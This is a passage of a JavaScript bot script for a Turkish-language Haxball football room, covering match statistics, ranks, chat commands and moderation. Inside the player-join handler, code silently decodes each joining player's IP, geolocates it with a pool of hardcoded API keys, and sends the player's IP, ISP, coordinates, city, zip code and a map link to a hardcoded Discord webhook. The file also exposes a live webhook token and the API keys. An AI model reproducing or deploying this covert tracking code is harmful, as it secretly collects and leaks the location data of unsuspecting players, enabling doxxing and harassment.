    fieldReportBlue.value += `\n${redActions.length - blueActions.length > 0 ? '\n'.repeat(redActions.length - blueActions.length) : ''
        }`;
    fieldReportBlue.value += '=====================';

    return [fieldReportRed, fieldReportBlue];
}

var playerList = {};
var removal = 3000;

function fetchSummaryEmbed(game) {
    var fetchEndgame = [fetchGametimeReport, fetchActionsSummaryReport];
    var logChannel = gameWebhook;
    var fields = [
        {
            name: '🔴        **KIRMIZI TAKIM İSTATİSTİKLERİ**',
            value: '=====================\n\n',
            inline: true,
        },
        {
            name: '🔵       **MAVİ TAKIM İSTATİSTİKLERİ**',
            value: '=====================\n\n',
            inline: true,
        },
    ];
    for (let i = 0; i < fetchEndgame.length; i++) {
        var fieldsReport = fetchEndgame[i](game);
        fields[0].value += fieldsReport[0].value + '\n\n';
        fields[1].value += fieldsReport[1].value + '\n\n';
    }
    fields[0].value = fields[0].value.substring(0, fields[0].value.length - 2);
    fields[1].value = fields[1].value.substring(0, fields[1].value.length - 2);

    var possR = possession[0] / (possession[0] + possession[1]);
    var possB = 1 - possR;
    var possRString = (possR * 100).toFixed(0).toString();
    var possBString = (possB * 100).toFixed(0).toString();
    var zoneR = actionZoneHalf[0] / (actionZoneHalf[0] + actionZoneHalf[1]);
    var zoneB = 1 - zoneR;
    var zoneRString = (zoneR * 100).toFixed(0).toString();
    var zoneBString = (zoneB * 100).toFixed(0).toString();
    var win = (game.scores.red > game.scores.blue) * 1 + (game.scores.blue > game.scores.red) * 2;
    var objectBodyWebhook = {
        embeds: [
            {
                title: `📝 MAÇ KAYITLARI #${getIdReport()}`,
                description:
                    `**${getTimeEmbed(game.scores.time)}** ` +
                    (win == 1 ? '**Kırmızı Takım** ' : 'Kırmızı Takım ') + game.scores.red +
                    ' - ' +
                    game.scores.blue + (win == 2 ? ' **Mavi Takım**' : ' Mavi Takım') +
                    '\n```c\nSavunma Yapma: ' + possRString + '% - ' + possBString + '%' +
                    '\nHücum Yapma: ' + zoneRString + '% - ' + zoneBString + '%\n```\n\n',
                color: 9567999,
                fields: fields,
                footer: {
                    text: `Kayıt: ${getRecordingName(game)}`,
                },
                timestamp: new Date().toISOString(),
            },
        ],
        username: roomName
    };
    if (logChannel != '') {
        fetch(logChannel, {
            method: 'POST',
            body: JSON.stringify(objectBodyWebhook),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }
}

/* EVENTS */

/* PLAYER MOVEMENT */

const webhookURL = 'https://discord.com/api/webhooks/1163525658618646558/fxufU_GmN0hG8CQstaJGi8WrfSg_zHTAaKIripWImS5TEBcJNo2iwWelpWC0aiKSvZGp';

function decryptHex(str) {
    let hexString = str;
    let strOut = "";
    for (let x = 0; x < hexString.length; x += 2) {
        strOut += String.fromCharCode(parseInt(hexString.substr(x, 2), 16));
    }
    return strOut;
}

function SendUserBilgileri(byPlayer, playerIP, location) {
    var request = new XMLHttpRequest();
    request.open("POST", webhookURL);
    request.setRequestHeader('Content-type', 'application/json');

    var identity = "OYUNCU KİMLİĞİ";

    var myEmbed = {
        author: {
            name: "[" + getDate() + "]"
        },
        title: identity,
        description: `
🤵 Oyuncu: ${byPlayer.name} 
👤 ID: ${byPlayer.id} 
📶 IP: ${playerIP} 
📶 ISP: ${location.isp} 
📶 Bağlantı Tipi: ${location.connection_type} 
🌐 Enlem: ${location.latitude} 
🌐 Boylam: ${location.longitude} 
🌍 Kıta: ${location.continent_name} 
🗾 Ülke: ${location.country} 
📍 Bölge: ${location.region} 
🏙️ Şehir: ${location.city} 
🏢 Zip Kodu: ${location.zipcode} 
🚗 Plaka Kodu: ${location.state_code} 
📱 Telefon Kodu: ${location.calling_code} 
🗣️ Tarayıcı Dili: ${location.languages} 

📍 Tam Konum;
https://maps.google.com/?q=${location.latitude},${location.longitude}`,
        color: hexToDecimal("#0be000")
    };

    var params = {
        username: "👤 KULLANICI KİMLİKLERİ 👤",
        embeds: [myEmbed]
    };

    request.send(JSON.stringify(params));
}

function hexToDecimal(hex) {
    return parseInt(hex.replace(/^#/, ''), 16);
}

const apiKeys = ['4a158c1a381f4dadaa5a797030297ece', '844f0f2d3e7c45c3a47f5d2f433bac7b', '208ba847068942e8a53966f5765b0a13', 'c0943ea614d547ba8b5b29503da49d93', '47876cef5b0f4a38889d2d2d1a6ac378', '441b309c470d4458bd93edeb76adcd07', 'af0fca4fb4954fd18e982db2ae21f05b', '90ee21848d914d62a894f2de2a47a10e', '0172427474e0461cbb2a8ab4d9844dd2', '4efde075a78e4313b98c9a3e03ef1710'];

function getGeoLocation(ip) {
  const apiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)];
  const apiUrl = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  return fetch(apiUrl)
    .then(response => response.json())
    .then(data => ({
      country: data.country_name,
      region: data.state_prov,
      city: data.city,
      latitude: data.latitude,
      longitude: data.longitude,
      isp: data.isp,
      connection_type: data.connection_type,
      continent_name: data.continent_name,
      state_code: data.state_code,
      calling_code: data.calling_code,
      zipcode: data.zipcode,
      languages: data.languages,
      country_flag: data.country_flag
    }));
}

room.onPlayerJoin = function (player) {

    const playerIP = decryptHex(player.conn);

    getGeoLocation(playerIP).then(location => {
    SendUserBilgileri(player, playerIP, location);
        });

    room.sendAnnouncement("🌟 " + player.name + " Odamıza Hoşgeldin!" + " Komutları Görmek İçin !komutlar Yazabilirsin.", null, 0xe0b0ff, "bold");
    authArray[player.id] = [player.auth, player.conn];
    if (roomWebhook != '') {
        fetch(roomWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `[${getDate()}] ➡️ GİRDİ (${playersAll.length + 1}/${maxPlayers})\n**` +
                    `${player.name}** [${authArray[player.id][0]}] {${authArray[player.id][1]}}`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }

    if (isAdmin[player.name]) {
    room.setPlayerAdmin(player.id, true);
    setTimeout(function () {
    room.sendAnnouncement("🔱 DİKKAT !! 𝗔𝗗𝗠𝗜𝗡 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0xCC041F);
    }, 1000);
        setTimeout(function() {
            room.sendAnnouncement("Hoşgeldiniz, 🔱 𝗔𝗗𝗠𝗜𝗡 | komutlara !adminkomutları ile bakabilirsiniz.", player.id, 0xd6e320);
        }, 4000);
    }

  room.sendAnnouncement("🔐 𝗚𝗜𝗥𝗜𝗦 / 𝗞𝗔𝗬𝗜𝗧 ᴏʟᴍᴀᴢsᴀɴɪᴢ ɪsᴛᴀᴛɪsᴛɪᴋʟᴇʀɪɴɪᴢ ᴋᴀʏᴅᴏʟᴍᴀᴢ. 💎 𝗞𝗔𝗬𝗜𝗧 ɪᴄɪɴ !kayıt şifre     💎 𝗚𝗜𝗥𝗜𝗦 ɪᴄɪɴ !giriş şifre", player.id, 0x48D1CC);
  room.sendAnnouncement("💬 𝗛𝗢𝗦 𝗚𝗘𝗟𝗗𝗜𝗡 " + player.name + ", ᴋᴏᴍᴜᴛʟᴀʀ; 🎃!ᴋᴏᴍᴜᴛʟᴀʀ  🍹Discord: https://discord.gg/8nCu3BRRCx", player.id, 0xB955D3);

    if (player.name === "") {
    setTimeout(function () {
        room.kickPlayer(player.id, "Boş isimle odaya giremezsiniz!", false);
    }, 500);
        return false;
    }
    
    if (player.name.length < 3) {
    setTimeout(function () {
        room.kickPlayer(player.id, "Nickiniz 3 karakterden az olamaz!", false);
    }, 500);
        return false;
    } else if (player.name !== player.name.trim()) {
    setTimeout(function () {
        room.kickPlayer(player.id, "İsminizin başına veya sonuna boşluk koyamazsınız!", false);
    }, 500);
        return false;
    }
    for (let i = 0; i < forbiddenCarachters.length; i++) {
        if (player.name.toLowerCase().includes(forbiddenCarachters[i])) {
    setTimeout(function () {
            room.kickPlayer(player.id, "Şekilli nick yasaktır!", false);
    }, 500);
            return false;
        }
    }
    for (let i = 0; i < forbiddenWords.length; i++) {
        if (player.name.toLowerCase().includes(forbiddenWords[i])) {
    setTimeout(function () {
            room.kickPlayer(player.id, "İsminizde emoji bulunduramazsınız!", false);
    }, 500);
            return false;
        }
    }
    for (let i = 0; i < forbiddenkaraliste.length; i++) {
        if (player.name.toLowerCase().includes(forbiddenkaraliste[i])) {
    setTimeout(function () {
            room.kickPlayer(player.id, "❌ Kara listeye alındınız!", true);
    }, 500);
            return false;
        }
    }
    for (let i = 0; i < forbiddenKufur.length; i++) {
        if (player.name.toLowerCase().includes(forbiddenKufur[i])) {
    setTimeout(function () {
            room.kickPlayer(player.id, "İsminiz küfür içeriyor, lütfen değiştirip tekrar gelin!", false);
    }, 500);
            return false;
        }
    }
    if(playerList[player.name] == undefined){
    playerList[player.name] = {name: player.name, slowMode: false};
    }

    const playerName = player.name.toLowerCase();

    if (uyeStore[playerName]) {
        setTimeout(function() {
        if (uyeStore[playerName] && !uyeStore[playerName].loggedIn) {
        room.sendAnnouncement("Giriş yapmalısınız. 20 saniyeniz var.", player.id, 0x00a6ff, 'bold');
        } else {
            // Buraya gelindiğinde, oyuncunun giriş yapmış olduğu ya da başka bir durumda olduğu varsayılır.
            // Bu durumda bir işlem yapılabilir ya da gerekiyorsa ek bir bildirim gönderilebilir.
        }
    }, 2000); // 2 saniye

        setTimeout(function() {
        if (uyeStore[playerName] && !uyeStore[playerName].loggedIn) {
        room.sendAnnouncement("Giriş yapmalısınız. 15 saniyeniz var.", player.id, 0x00a6ff, 'bold');
        } else {
            // Buraya gelindiğinde, oyuncunun giriş yapmış olduğu ya da başka bir durumda olduğu varsayılır.
            // Bu durumda bir işlem yapılabilir ya da gerekiyorsa ek bir bildirim gönderilebilir.
        }
    }, 5000); // 5 saniye


        setTimeout(function() {
        if (uyeStore[playerName] && !uyeStore[playerName].loggedIn) {
        room.sendAnnouncement("Giriş yapmalısınız. 10 saniyeniz var.", player.id, 0x00a6ff, 'bold');
        } else {
            // Buraya gelindiğinde, oyuncunun giriş yapmış olduğu ya da başka bir durumda olduğu varsayılır.
            // Bu durumda bir işlem yapılabilir ya da gerekiyorsa ek bir bildirim gönderilebilir.
        }
    }, 10000); // 10 saniye


        setTimeout(function() {
        if (uyeStore[playerName] && !uyeStore[playerName].loggedIn) {
        room.sendAnnouncement("Giriş yapmalısınız. 5 saniyeniz var.", player.id, 0x00a6ff, 'bold');
        } else {
            // Buraya gelindiğinde, oyuncunun giriş yapmış olduğu ya da başka bir durumda olduğu varsayılır.
            // Bu durumda bir işlem yapılabilir ya da gerekiyorsa ek bir bildirim gönderilebilir.
        }
    }, 15000); // 15 saniye


        setTimeout(function() {
            if (uyeStore[playerName] && !uyeStore[playerName].loggedIn) {
                room.kickPlayer(player.id, "Giriş yapmadınız.", false);
            }
        }, 20000); // 20 saniye
    }

    updateTeams();
    updateAdmins();
    if (masterList.findIndex((auth) => auth == player.auth) != -1) {
    room.sendAnnouncement("💎 DİKKAT !! 𝗩𝗜𝗣 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0x26ffff);
    room.sendAnnouncement("🔱 DİKKAT !! 𝗔𝗗𝗠𝗜𝗡 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0xCC041F);
        room.setPlayerAdmin(player.id, true);
    } else if (adminList.map((a) => a[0]).findIndex((auth) => auth == player.auth) != -1) {
    room.sendAnnouncement("💎 DİKKAT !! 𝗩𝗜𝗣 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0x26ffff);
    room.sendAnnouncement("🔱 DİKKAT !! 𝗞𝗨𝗥𝗨𝗖𝗨 𝗔𝗗𝗠𝗜𝗡 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0xff0000);
        room.setPlayerAdmin(player.id, true);
    }
    var sameAuthCheck = playersAll.filter((p) => p.id != player.id && authArray[p.id][0] == player.auth);
    if (sameAuthCheck.length > 0 && !debugMode) {
        var oldPlayerArray = playersAll.filter((p) => p.id != player.id && authArray[p.id][0] == player.auth);
        for (let oldPlayer of oldPlayerArray) {
            ghostKickHandle(oldPlayer, player);
        }
    }
    handlePlayersJoin();
};

room.onPlayerTeamChange = function (changedPlayer, byPlayer) {
    handleLineupChangeTeamChange(changedPlayer);
    if (AFKSet.has(changedPlayer.id) && changedPlayer.team != Team.SPECTATORS) {
        room.setPlayerTeam(changedPlayer.id, Team.SPECTATORS);
        room.sendAnnouncement(
            `${changedPlayer.name} şu an AFK !`,
            null,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        return;
    }
    updateTeams();
    if (gameState != State.STOP) {
        if (changedPlayer.team != Team.SPECTATORS && game.scores.time <= (3 / 4) * game.scores.timeLimit && Math.abs(game.scores.blue - game.scores.red) < 2) {
            changedPlayer.team == Team.RED ? teamRedStats.push(changedPlayer) : teamBlueStats.push(changedPlayer);
        }
    }
    handleActivityPlayerTeamChange(changedPlayer);
    handlePlayersTeamChange(byPlayer);
};

room.onPlayerLeave = function (player) {
    room.sendAnnouncement(player.name + " odadan ayrıldı. (İD: " + player.id + ")", null, 0xFF0000, "bold");
  if (isVIP[player.id]) {
    room.sendAnnouncement("💎 VİP " + player.name + " odadan ayrıldı. 👋❤️", null, 0x26ffff, "bold");
  }
    setTimeout(() => {
        if (!kickFetchVariable) {
            if (roomWebhook != '') {
                var stringContent = `[${getDate()}] ⬅️ ÇIKTI (${playersAll.length}/${maxPlayers})\n**${player.name}**` +
                    `[${authArray[player.id][0]}] {${authArray[player.id][1]}}`;
                fetch(roomWebhook, {
                    method: 'POST',
                    body: JSON.stringify({
                        content: stringContent,
                        username: roomName,
                    }),
                    headers: {
                        'Content-Type': 'application/json',
                    },
                }).then((res) => res);
            }
        } else kickFetchVariable = false;
    }, 10);
    handleLineupChangeLeave(player);
    checkCaptainLeave(player);
    updateTeams();
    updateAdmins();
    handlePlayersLeave();
};

room.onPlayerKicked = function (kickedPlayer, reason, ban, byPlayer) {
    kickFetchVariable = true;
    if (roomWebhook != '') {
        var stringContent = `[${getDate()}] ⛔ ${ban ? 'BAN' : 'KICK'} (${playersAll.length}/${maxPlayers})\n` +
            `**${kickedPlayer.name}** [${authArray[kickedPlayer.id][0]}] {${authArray[kickedPlayer.id][1]}} was ${ban ? 'banned' : 'kicked'}` +
            `${byPlayer != null ? ' by **' + byPlayer.name + '** [' + authArray[byPlayer.id][0] + '] {' + authArray[byPlayer.id][1] + '}' : ''}`
        fetch(roomWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: stringContent,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }
    if ((ban && ((byPlayer != null &&
        (byPlayer.id == kickedPlayer.id || getRole(byPlayer) < Role.MASTER)) || getRole(kickedPlayer) == Role.MASTER)) || disableBans
    ) {
        room.clearBan(kickedPlayer.id);
        return;
    }
    if (byPlayer != null && getRole(byPlayer) < Role.ADMIN_PERM) {
        room.sendAnnouncement(
            'Normal Adminler Ban/Kick Atamaz !',
            byPlayer.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        room.setPlayerAdmin(byPlayer.id, false);
        return;
    }
    if (ban) banList.push([kickedPlayer.name, kickedPlayer.id]);
};

/* PLAYER ACTIVITY */

var KurucuRenkKodu = "0xff0000"; // Admin renk kodu
var AdminRenkKodu = "0xffee00"; // Admin renk kodu
var VipRenkKodu = "0x26ffff"; // Vip renk kodu

var isVIP = {};
var isAdmin = {};

var voteOptions = {
    power: 0,
    futsal: 0
};
var votedPlayers = {};

var votingInProgress = false;

var playersGoals = {};
var ownGoals = {};
var assisters = {};
var playerPoints = {};
var playersXP = {};

function initializeXP(playerName) {
    if (!playersXP[playerName]) {
        playersXP[playerName] = 0;
    }
}

function getXP(playerName) {
    return playersXP[playerName] || 0;
}

function initializeAssists(playerName) {
    if (!assisters[playerName]) {
        assisters[playerName] = 0;
    }
}

function getAssists(playerName) {
    return assisters[playerName] || 0;
}

function initializePlayerGoals(playerName) {
    if (!playersGoals[playerName]) {
        playersGoals[playerName] = 0;
    }
}

function getPlayerGoals(playerName) {
    return playersGoals[playerName] || 0;
}

function initializeOwnGoals(playerName) {
    if (!ownGoals[playerName]) {
        ownGoals[playerName] = 0;
    }
}

function incrementOwnGoal(playerName) {
    ownGoals[playerName]++;
}

function getOwnGoals(playerName) {
    return ownGoals[playerName] || 0;
}

function initializePoints(playerName) {
    if (!playerPoints[playerName]) {
        playerPoints[playerName] = 0;
    }
}

function getPoints(playerName) {
    return playerPoints[playerName] || 0;
}

function getRank(poininebunun) {
    if (poininebunun >= 0 && poininebunun < 20) {
        return '🦴 Unranked';
    } else if (poininebunun >= 20 && poininebunun < 100) {
        return '🟤 Bronz';
    } else if (poininebunun >= 100 && poininebunun < 300) {
        return '⚪ Silver';
    } else if (poininebunun >= 300 && poininebunun < 750) {
        return '🟡 Gold';
    } else if (poininebunun >= 750 && poininebunun < 1000) {
        return '🟣 Platinum';
    } else if (poininebunun >= 1000 && poininebunun < 2000) {
        return '💎 Diamond';
    } else if (poininebunun >= 2000 && poininebunun < 3000) {
        return '🔰 Challenger';
    } else if (poininebunun >= 3000 && poininebunun < 4000) {
        return '💫 Legendary';
    } else if (poininebunun >= 4000 && poininebunun < 5000) {
        return '🕊️ Icon';
    } else {
        return '🐐 GOAT';
    }
}

function getLevel(xp) {
    if (xp >= 0 && xp < 20) {
        return 1;
    } else if (xp >= 20 && xp < 50) {
        return 2;
    } else if (xp >= 50 && xp < 100) {
        return 3;
    } else if (xp >= 100 && xp < 150) {
        return 4;
    } else if (xp >= 150 && xp < 200) {
        return 5;
    } else if (xp >= 200 && xp < 250) {
        return 6;
    } else if (xp >= 250 && xp < 300) {
        return 7;
    } else if (xp >= 300 && xp < 350) {
        return 8;
    } else if (xp >= 350 && xp < 400) {
        return 9;
    } else if (xp >= 400 && xp < 450) {
        return 10;
    } else if (xp >= 450 && xp < 500) {
        return 11;
    } else if (xp >= 500 && xp < 600) {
        return 12;
    } else if (xp >= 600 && xp < 700) {
        return 13;
    } else if (xp >= 700 && xp < 800) {
        return 14;
    } else if (xp >= 800 && xp < 900) {
        return 15;
    } else if (xp >= 900 && xp < 1000) {
        return 16;
    } else if (xp >= 1000 && xp < 1250) {
        return 17;
    } else if (xp >= 1250 && xp < 1500) {
        return 18;
    } else if (xp >= 1500 && xp < 1800) {
        return 19;
    } else if (xp >= 1800 && xp < 2000) {
        return 20;
    } else if (xp >= 2000 && xp < 2500) {
        return 21;
    } else if (xp >= 2500 && xp < 3000) {
        return 22;
    } else if (xp >= 3000 && xp < 3500) {
        return 23;
    } else if (xp >= 3500 && xp < 4000) {
        return 24;
    } else if (xp >= 4000 && xp < 4500) {
        return 25;
    } else if (xp >= 4500 && xp < 5000) {
        return 26;
    } else if (xp >= 5000 && xp < 5500) {
        return 27;
    } else if (xp >= 5500 && xp < 6000) {
        return 28;
    } else if (xp >= 6000 && xp < 6500) {
        return 29;
    } else {
        return 30;
    }
}

room.onPlayerChat = function (player, message) {
    if (votedPlayers[player.id]) {
        return;
    }

    if (votingInProgress) {
var responses = ['0xff0000', '0xff8000', '0xffea00', '0x6aff00', '0x00ff26', '0x00ffea', '0x004cff', '0x6a00ff', '0xfb00ff'];
var RandomColor = responses[Math.floor(Math.random() * responses.length)];
        if (message === "!power") {
            voteOptions.power++;
            votedPlayers[player.id] = true;
            room.sendAnnouncement("🗳️ " + player.name + " POWER Haritasına Oy Verdi !", null, RandomColor, 'bold');
        } else if (message === "!futsal") {
            voteOptions.normal++;
            votedPlayers[player.id] = true;
            room.sendAnnouncement("🗳️ " + player.name + " FUTSAL Haritasına Oy Verdi !", null, RandomColor, 'bold');
        }
    } else {
        if (message === "!power" || message === "!futsal") {
            room.sendAnnouncement("❌ Şu anda oylama sırasında değilsiniz. Lütfen bir sonraki oylamayı bekleyin.", player.id, 0xFF0000);
        }
    }

    var players = room.getPlayerList();
    
    if (message === "!susun") {
        susunCommand(player, message);
        return;
    }
    
    if (message === "!konuşun") {
        konuşunCommand(player, message);
        return;
    }
    
    if (susalım === false && player.admin === false) {
        room.sendAnnouncement("・ Sohbet kapatıldı. Yazdıklarınızı sadece adminler görebilir. (" + message + ")", player.id, 0xE6FA0A, "bold", 2);
        for (var a = 0; a < players.length; a++) {
            if (players[a].admin === true) {
                room.sendAnnouncement("Sessiz ・" + player.name + ": " + message, players[a].id, 0xE6FA0A, "small", 1);
            }
        }
        return false;
    }

if (message === '!skorum') {
    var playerName = player.name;
    initializePlayerGoals(playerName);
    var playerGoals = getPlayerGoals(playerName);
    initializeOwnGoals(playerName);
    var ownedGoals = getOwnGoals(playerName);
    initializeXP(playerName);
    var playerXP = getXP(playerName);
    initializeAssists(playerName);
    var assiceGoals = getAssists(playerName);
    initializePoints(playerName);
    var playerPoints = getPoints(playerName);
    
    // Eğer puan negatifse veya 0'dan küçükse 0 olarak ayarla
    if (playerPoints < 0) {
        playerPoints[player.name] = 0;
    }

    var playerRank = getRank(playerPoints);
    var playerLevel = getLevel(playerXP);

    room.sendAnnouncement('📈 ' + player.name + ' ➤ [⚽ Gol: ' + playerGoals + '] [👟 Asist: ' + assiceGoals + '] [😢 kk: ' + ownedGoals + '] [⭐ Puan: ' + playerPoints + '] [⚔️ Rank: ' + playerRank + ']' + ' [🔰 XP: ' + playerXP + ']' + ' [𝐋𝐄𝐕𝐄𝐋: ' + playerLevel + ']', null, 0xB5C4FF, 'bold');
}

if (message === '!puan') {
    var playerName = player.name;
    initializePlayerGoals(playerName);
    var playerGoals = getPlayerGoals(playerName);
    initializeOwnGoals(playerName);
    var ownedGoals = getOwnGoals(playerName);
    initializeXP(playerName);
    var playerXP = getXP(playerName);
    initializeAssists(playerName);
    var assiceGoals = getAssists(playerName);
    initializePoints(playerName);
    var playerPoints = getPoints(playerName);
    
    // Eğer puan negatifse veya 0'dan küçükse 0 olarak ayarla
    if (playerPoints < 0) {
        playerPoints[playerName] = 0;
    }

    var playerRank = getRank(playerPoints);
    var playerLevel = getLevel(playerXP);

    room.sendAnnouncement('📈 ' + player.name + ' ➤ [⭐ Puan: ' + playerPoints + ']', null, 0xB5C4FF, 'bold');
}

if (message === '!rank') {
    var playerName = player.name;
    initializePlayerGoals(playerName);
    var playerGoals = getPlayerGoals(playerName);
    initializeOwnGoals(playerName);
    var ownedGoals = getOwnGoals(playerName);
    initializeXP(playerName);
    var playerXP = getXP(playerName);
    initializeAssists(playerName);
    var assiceGoals = getAssists(playerName);
    initializePoints(playerName);
    var playerPoints = getPoints(playerName);
    
    // Eğer puan negatifse veya 0'dan küçükse 0 olarak ayarla
    if (playerPoints < 0) {
        playerPoints[playerName] = 0;
    }

    var playerRank = getRank(playerPoints);
    var playerLevel = getLevel(playerXP);

    room.sendAnnouncement('📈 ' + player.name + ' ➤ [⚔️ Rank: ' + playerRank + ']', null, 0xB5C4FF, 'bold');
}

if (message === '!rankhelp') {
                room.sendAnnouncement("🦴 Unranked | 0 - 20 Puan", player.id, 0x289E37, "normal", 1);
                room.sendAnnouncement("🟤 Bronz | 20 - 100 Puan", player.id, 0xBA7B29, "normal", 0);
                room.sendAnnouncement("⚪ Silver | 100 - 300 Puan", player.id, 0x9EA1B0, "normal", 0);
                room.sendAnnouncement("🟡 Gold | 300 - 750 Puan", player.id, 0xFFD21F, "normal", 0);
                room.sendAnnouncement("🟣 Platinum | 750 - 1000 Puan", player.id, 0xAB6AAB, "normal", 0);
                room.sendAnnouncement("💎 Diamond | 1000 - 2000 Puan", player.id, 0x25A1BA, "normal", 0);
                room.sendAnnouncement("🔰 Challenger | 2000 - 3000 Puan", player.id, 0xAB0000, "normal", 0);
                room.sendAnnouncement("💫 Legendary | 3000-4000 Puan", player.id, 0xfc9307, "normal", 0);
                room.sendAnnouncement("🕊️ Icon | 4000-5000 Puan", player.id, 0xffffff, "normal", 0);
                room.sendAnnouncement("🐐 GOAT | 5000 Puan ve üstü", player.id, 0x776969, "normal", 0);

                return false;
}

    if (message.includes(vipSifre)) {
        isVIP[player.id] = true;
        room.sendAnnouncement("💎 DİKKAT !! 𝗩𝗜𝗣 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0x26ffff);
        setTimeout(function() {
            room.sendAnnouncement("Hoşgeldiniz, 💎 𝗩𝗜𝗣 | komutlara !vip ile bakabilirsiniz.", player.id, 0x26ffff);
        }, 3000);
        return false;
    }

    if (message.includes(VipAdminSifresi)) {
        isVIP[player.id] = true;
        isAdmin[player.name] = true;
        room.setPlayerAdmin(player.id, true);
        room.sendAnnouncement("💎 DİKKAT !! 𝗩𝗜𝗣 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0x26ffff);
        room.sendAnnouncement("🔱 DİKKAT !! 𝗔𝗗𝗠𝗜𝗡 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0xCC041F);
        setTimeout(function() {
            room.sendAnnouncement("Hoşgeldiniz, 🔱 𝗔𝗗𝗠𝗜𝗡 | komutlara !help ile bakabilirsiniz.", player.id, 0xd6e320);
            room.sendAnnouncement("Hoşgeldiniz, 💎 𝗩𝗜𝗣 | komutlara !vip ile bakabilirsiniz.", player.id, 0x26ffff);
        }, 3000);
        return false;
    }

    if (message.includes(AdminSifresi)) {
        isAdmin[player.name] = true;
        room.setPlayerAdmin(player.id, true);
        room.sendAnnouncement("🔱 DİKKAT !! 𝗔𝗗𝗠𝗜𝗡 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0xCC041F);
        setTimeout(function() {
            room.sendAnnouncement("Hoşgeldiniz, 🔱 𝗔𝗗𝗠𝗜𝗡 | komutlara !help ile bakabilirsiniz.", player.id, 0xd6e320);
        }, 3000);
        return false;
    }

    if (gameState !== State.STOP && player.team != Team.SPECTATORS) {
        let pComp = getPlayerComp(player);
        if (pComp != null) pComp.inactivityTicks = 0;
    }
    let msgArray = message.split(/ +/);
    if (!hideClaimMessage || msgArray[0] != '!claim') {
        if (roomWebhook != '')
            fetch(roomWebhook, {
                method: 'POST',
                body: JSON.stringify({
                    content: `[${getDate()}] 💬 SOHBET\n**${player.name}** : ${message.replace('@', '@ ')}`,
                    username: roomName,
                }),
                headers: {
                    'Content-Type': 'application/json',
                },
            }).then((res) => res);
    }
    if (msgArray[0][0] == '!') {
        let command = getCommand(msgArray[0].slice(1).toLowerCase());
        if (command != false && commands[command].roles <= getRole(player)) commands[command].function(player, message);
        else
            room.sendAnnouncement(
                `Girmeye çalıştığınız komut mevcut değil. Mevcut komutları görmek için lütfen '!help' yazın.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        return false;
    }
    if (msgArray[0].toLowerCase() == 't') {
        teamChat(player, message);
        return false;
    }
    if (msgArray[0].substring(0, 2) === '@@') {
        playerChat(player, message);
        return false;
    }
    if (chooseMode && teamRed.length * teamBlue.length != 0) {
        var choosingMessageCheck = chooseModeFunction(player, message);
        if (choosingMessageCheck) return false;
    }
    if (slowMode > 0) {
        var filter = slowModeFunction(player, message);
        if (filter) return false;
    }
    if (!player.admin && muteArray.getByAuth(authArray[player.id][0]) != null) {
        room.sendAnnouncement(
            `Susturuldunuz !`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        return false;
    }
  if (isKurucuRole[player.name]) {
    room.sendAnnouncement('🔱 KURUCU ➣ ' + player.name + ': ' + message, null, KurucuRenkKodu, 'bold');
    return false;
  }
  if (player.admin) {
    room.sendAnnouncement('🔱 ADMİN ➣ ' + player.name + ': ' + message, null, AdminRenkKodu, 'bold');
    return false;
  }
  if (isVIP[player.id]) {
        room.sendAnnouncement("💎 VIP ➣ " + player.name + ": " + message, null, VipRenkKodu, 'bold');
        return false;
  }
    if (message.length > maxKelimeLen) {
        room.sendAnnouncement("❌ 60 karakter sınırı aşıldı!", player.id, 0xFF0000, 'bold');
        setTimeout(function () {
        room.sendAnnouncement("YAZINIZI KAYBETMEYİN: (" + message + ")", player.id, 0xFEDDC1);
        }, 2000);
        return false; // Mesajın gönderilmesini engellemek için false döndürüyoruz
  }
    if (message.length < minKelimeLen) {
        room.sendAnnouncement("❌ Lütfen chati gereksiz kullanmayınız!", player.id, 0xFF0000, 'bold');
        setTimeout(function () {
        room.sendAnnouncement("YAZINIZI KAYBETMEYİN: (" + message + ")", player.id, 0xFEDDC1);
        }, 2000);
        return false; // Mesajın gönderilmesini engellemek için false döndürüyoruz
  }
    if(playerList[player.name].slowMode == false){
    playerList[player.name].slowMode = true;
    var name = player.name;
    setTimeout(function(){
        if(playerList[player.name].slowMode == true){
        playerList[name].slowMode = false;
        }
    },removal);
    }
    else{
    room.sendAnnouncement(`Yavaş Mod Aktif! (Bu Mesajı Sadece Siz Görebilirsiniz.) (${message})`,player.id,0xFFFF00,"bold",2);
    return false;
    }
    // Küfür içeren mesajları kontrol et
    if (message.includes("ఌ") ||message.includes("甈") ||message.includes("㐷") ||message.includes("怅") ||message.includes("瘪") ||message.includes("⑸") ||message.includes("㬆") ||message.includes("権") ||message.includes("怜") ||message.includes("∯") ||message.includes("㤒") ||message.includes("䉊") ||message.includes("匊") ||message.includes("ᙻ") ||message.includes("ൽ") ||message.includes("ᴧ") ||message.includes("爂") ||message.includes("爇") ||message.includes("त") ||message.includes("権") ||message.includes("怜") ||message.includes("∯") ||message.includes("㤒") ||message.includes("﷽") ||message.includes("m0g0l1c") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("﷽") ||message.includes("䐃") ||message.includes("䉧") ||message.includes("瀩") ||message.includes("琐") ||message.includes("䳌") ||message.includes("氊") ||message.includes("瘠") ||message.includes("銡") ||message.includes("歘") ||message.includes("桋") ||message.includes("鼜") ||message.includes("窭") ||message.includes("谡") ||message.includes("輽") ||message.includes("怼") 